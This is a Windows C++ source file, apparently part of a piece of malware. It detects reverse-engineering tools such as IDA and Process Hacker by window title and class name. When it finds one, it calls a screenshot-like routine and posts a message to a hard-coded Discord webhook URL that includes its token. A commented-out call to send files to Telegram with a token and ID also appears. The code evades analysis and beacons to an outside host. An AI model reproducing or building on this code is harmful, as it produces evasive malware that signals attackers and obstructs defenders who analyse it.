#define CURL_STATICLIB
#include <windows.h>
#include <iostream>
#include <vector>
#include <curl/curl.h>

#include "And now he's dead for me, too.h"
#include "meinu_ketsu_de_shiharau.h"
#include "soreha_kai_re_tei_masu_kanzen_ni.h"
#include "turn_around_anywhere.h"

HWND hwnd;
CHAR W_Name[256];
CHAR C_Name[256];
bool shoha = false;
void request_DS();

BOOL CALLBACK detect(HWND hwnd, LPARAM lParam) {
        
    GetWindowTextA(hwnd, W_Name, sizeof(W_Name));
    GetClassNameA(hwnd, C_Name, sizeof(C_Name));
    const char* idaTitles[] = { "IDA", "IDA Pro", "IDA Disassembler", "IDA Free" };
    for (const char* title : idaTitles) {
        if (strstr(W_Name, title) != nullptr || strstr(C_Name, title) != nullptr) {
            shoha = true;
            return FALSE;
        }
    }
    //if musko no kijutse sa se // стань бывшим
    if (strstr(W_Name, "Process Hacker") != nullptr || strcmp(C_Name, "ProcessHacker") == 0) {
        shoha = true;
        return FALSE;
    }
    return TRUE;
}

void otlov_c(){
    EnumWindows(detect, 0);
    std::string scname("sce2qc.jpg");
    std::vector<std::string>list{ "ProcessHacker","Process Hacker", "IDA", "IDA Pro", "IDA Disassembler", "IDA Free"};
    for(std::string& p : list){
        if (strcmp(C_Name, p.c_str()) == 0) {
            shoha = true;
        }
    }
    if (shoha) {
        sc();
        //sendtotg(scname, token, id);
        request_DS();
        yuki();

    }

}

int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    otlov_c();
    return 0;
}

void request_DS() {
    CURL* curl;
    CURLcode res;
    const char* name("Name is one");
    const char* WEBHOOK = "https://discord.com/api/webhooks/1302753407601217536/LIToD1Qq5B3kKUWMl-FC64x9UFnSKesW_FmQ7gzCaT3npoT4uMdfyL5o5OOA7JGioLhM";
    char content[256];
    snprintf(content, sizeof(content), "{\"content\": \"%s\"}", name);

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, content);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "C_Err: %s\n", curl_easy_strerror(res));
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}
//это バカげ た 見世物